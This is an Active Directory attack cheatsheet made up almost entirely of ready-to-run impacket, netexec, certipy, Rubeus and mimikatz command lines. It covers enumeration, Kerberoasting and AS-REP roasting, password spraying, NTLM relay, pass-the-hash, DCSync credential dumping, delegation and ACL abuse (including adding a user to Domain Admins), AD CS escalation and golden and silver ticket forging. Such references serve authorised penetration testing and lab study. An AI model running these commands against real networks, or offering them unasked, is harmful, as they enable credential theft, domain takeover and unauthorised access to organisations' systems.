---
title: "Active Directory Cheatsheet - impacket, netexec, certipy, rubeus"
category: misc
subcategory: active-directory
type: cheatsheet
tags: [active-directory, impacket, netexec, crackmapexec, certipy, rubeus, mimikatz, bloodhound, kerberoasting, asreproast, pass-the-hash, dcsync, ntlm-relay, ldapsearch]
summary: "Full command lines for AD attacks: enumeration, roasting, spraying, relay, PtH/PtT, delegation, AD CS, DCSync and ticket forging."
related: [ad-enumeration-bloodhound, ad-kerberoasting-asreproast, ad-credential-attacks, ad-acl-delegation-abuse, ad-adcs-esc-attacks]
---

Set: `DOM=corp.local  DC=10.10.10.5  U=jdoe  P='Summer2024!'`

## Enumeration

```bash
netexec smb $DC                                             # OS/domain/signing
netexec smb $DC -u '' -p '' --shares --users                # null session
netexec smb $DC -u $U -p $P --pass-pol                       # password policy
netexec smb $DC -u $U -p $P --users --groups --loggedon-users   # objects
netexec smb $DC -u $U -p $P --rid-brute 4000                 # RID cycling
enum4linux-ng -A $DC                                          # one-shot enum
rpcclient -U '' -N $DC -c 'enumdomusers'                      # RPC null users
ldapsearch -x -H ldap://$DC -s base namingContexts            # base DN
ldapsearch -x -H ldap://$DC -D "$U@$DOM" -w "$P" -b 'DC=corp,DC=local'   # authed dump
ldapdomaindump -u "$DOM\\$U" -p "$P" $DC -o ldd/              # bulk dump
lookupsid.py $U:$P@$DC                                         # SID brute
```

## BloodHound collection

```bash
bloodhound-python -u $U -p $P -d $DOM -dc dc01.$DOM -c All -ns $DC --zip   # remote python
bloodhound-python -u $U -p $P -d $DOM -dc dc01.$DOM -c DCOnly -ns $DC --zip # stealthy
rusthound -d $DOM -u $U -p $P -i $DC -c All -z                # rust collector
# Windows:  .\SharpHound.exe -c All --zipfilename corp.zip
```

## Kerberos: AS-REP roasting

```bash
GetNPUsers.py $DOM/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile asrep.hash   # no creds
GetNPUsers.py $DOM/$U:$P -request -dc-ip $DC -format hashcat -outputfile asrep.hash   # with creds
netexec ldap $DC -u $U -p $P --asreproast asrep.hash          # netexec
hashcat -m 18200 asrep.hash rockyou.txt -r rules/best64.rule   # crack
# Windows:  .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hash
```

## Kerberos: Kerberoasting

```bash
GetUserSPNs.py $DOM/$U:$P -dc-ip $DC -request -outputfile kerb.hash   # roast all SPNs
GetUserSPNs.py $DOM/$U:$P -dc-ip $DC -request-user svc-sql -outputfile kerb.hash   # one SPN
netexec ldap $DC -u $U -p $P --kerberoasting kerb.hash        # netexec
hashcat -m 13100 kerb.hash rockyou.txt -r rules/best64.rule    # RC4 crack
hashcat -m 19700 kerb.hash rockyou.txt                         # AES256 crack
targetedKerberoast.py -v -d $DOM -u $U -p $P --dc-ip $DC        # GenericWrite -> add SPN -> roast
# Windows:  .\Rubeus.exe kerberoast /nowrap /format:hashcat
```

## Password spraying

```bash
netexec smb $DC -u users.txt -p 'Winter2024!' --continue-on-success   # one pass many users
netexec smb $DC -u users.txt -p users.txt --no-bruteforce --continue-on-success   # user==pass
kerbrute passwordspray -d $DOM --dc $DC users.txt 'Winter2024!'   # kerbrute
kerbrute userenum -d $DOM --dc $DC users.txt                    # user enumeration
```

## NTLM relay

```bash
netexec smb 10.10.10.0/24 --gen-relay-list targets.txt         # hosts w/o signing
responder -I tun0 -dwv                                          # poison (SMB/HTTP off in .conf to relay)
ntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'          # relay -> exec
ntlmrelayx.py -tf targets.txt -smb2support -socks               # relay -> SOCKS
ntlmrelayx.py -t ldaps://$DC --escalate-user $U                 # relay -> LDAP ACL edit
mitm6 -d $DOM                                                   # IPv6 DNS takeover
ntlmrelayx.py -6 -t ldaps://dc01.$DOM -wh fakewpad.$DOM --delegate-access   # mitm6 combo
```

## Pass-the-hash / ticket / key

```bash
netexec smb 10.10.10.0/24 -u Administrator -H :NTHASH          # PtH validate
psexec.py -hashes :NTHASH $DOM/Administrator@$DC               # PtH shell
wmiexec.py -hashes :NTHASH $DOM/Administrator@$DC              # PtH (quieter)
evil-winrm -i $DC -u Administrator -H NTHASH                    # PtH WinRM
xfreerdp /u:Administrator /pth:NTHASH /v:$DC                    # PtH RDP
getTGT.py -hashes :NTHASH $DOM/Administrator -dc-ip $DC        # overpass-the-hash
export KRB5CCNAME=Administrator.ccache && psexec.py -k -no-pass $DOM/Administrator@dc01.$DOM   # use ticket
ticketConverter.py ticket.kirbi ticket.ccache                  # kirbi <-> ccache
# Windows:  .\Rubeus.exe asktgt /user:Administrator /rc4:NTHASH /ptt
```

## DCSync and credential dumping

```bash
secretsdump.py -just-dc-ntlm $DOM/Administrator:'P@ss'@$DC     # all NTLM hashes
secretsdump.py -just-dc-user krbtgt $DOM/Administrator:'P@ss'@$DC   # krbtgt only
netexec smb $DC -u Administrator -p 'P@ss' --ntds              # netexec ntds
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL # offline hives
secretsdump.py $DOM/Administrator:'P@ss'@10.10.10.7            # remote SAM+LSA
netexec smb 10.10.10.0/24 -u Administrator -H :NTHASH -M lsassy # lsass across hosts
hashcat -m 1000 nt.hashes rockyou.txt -r rules/best64.rule     # crack NTLM
# Windows:  lsadump::dcsync /user:krbtgt   |   sekurlsa::logonpasswords
```

## Delegation abuse

```bash
# constrained delegation (S4U)
getST.py -spn cifs/target.$DOM -impersonate Administrator -dc-ip $DC $DOM/svc-web:'SvcP@ss'
# RBCD
addcomputer.py -computer-name 'EVIL$' -computer-pass 'EvilP@ss123' -dc-ip $DC $DOM/$U:$P
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write -dc-ip $DC $DOM/$U:$P
getST.py -spn cifs/target.$DOM -impersonate Administrator -dc-ip $DC "$DOM/EVIL\$:EvilP@ss123"
# unconstrained: coerce + capture
printerbug.py $DOM/$U:$P@dc01.$DOM ATTACKER_HOST
PetitPotam.py -u $U -p $P -d $DOM ATTACKER_HOST dc01.$DOM
```

## ACL abuse

```bash
net rpc password 'victim' 'NewP@ss123' -U "$DOM/$U%$P" -S $DC   # GenericAll -> reset pw
bloodyAD -u $U -p $P -d $DOM --host $DC set password victim 'NewP@ss123'   # bloodyAD
bloodyAD -u $U -p $P -d $DOM --host $DC add groupMember 'Domain Admins' $U  # AddMember
owneredit.py -action write -new-owner $U -target victim "$DOM/$U:$P" -dc-ip $DC   # WriteOwner
dacledit.py -action write -rights FullControl -principal $U -target victim "$DOM/$U:$P" -dc-ip $DC   # WriteDACL
certipy shadow auto -u $U@$DOM -p $P -account victim -dc-ip $DC   # shadow credentials
```

## AD CS (certipy)

```bash
certipy find -u $U@$DOM -p $P -dc-ip $DC -vulnerable -stdout    # find ESC conditions
certipy req -u $U@$DOM -p $P -dc-ip $DC -ca CORP-CA -template Vuln -upn administrator@$DOM   # ESC1
certipy req -u $U@$DOM -p $P -dc-ip $DC -ca CORP-CA -template User -upn administrator@$DOM   # ESC6
certipy ca -u $U@$DOM -p $P -dc-ip $DC -ca CORP-CA -add-officer $U   # ESC7 add officer
certipy relay -target http://ca.$DOM -template DomainController   # ESC8 relay
certipy auth -pfx administrator.pfx -dc-ip $DC                  # PKINIT -> TGT + NT hash
```

## Ticket forging

```bash
ticketer.py -nthash KRBTGT_NT -domain-sid S-1-5-21-... -domain $DOM Administrator   # golden
ticketer.py -nthash MACHINE_NT -domain-sid S-1-5-21-... -domain $DOM -spn cifs/host.$DOM Administrator   # silver
export KRB5CCNAME=Administrator.ccache
```

## Execution

```bash
psexec.py $DOM/Administrator:'P@ss'@$DC                         # SYSTEM shell (noisy)
wmiexec.py $DOM/Administrator:'P@ss'@$DC                        # WMI (quieter)
smbexec.py $DOM/Administrator:'P@ss'@$DC                        # no binary dropped
atexec.py $DOM/Administrator:'P@ss'@$DC whoami                  # scheduled task one-shot
netexec smb 10.10.10.0/24 -u Administrator -p 'P@ss' -x 'whoami'   # command across hosts
evil-winrm -i $DC -u Administrator -p 'P@ss'                    # WinRM shell
```

## Housekeeping

```bash
sudo ntpdate $DC                                               # fix clock skew for Kerberos
echo "$DC dc01.$DOM $DOM" | sudo tee -a /etc/hosts             # FQDN resolution
```
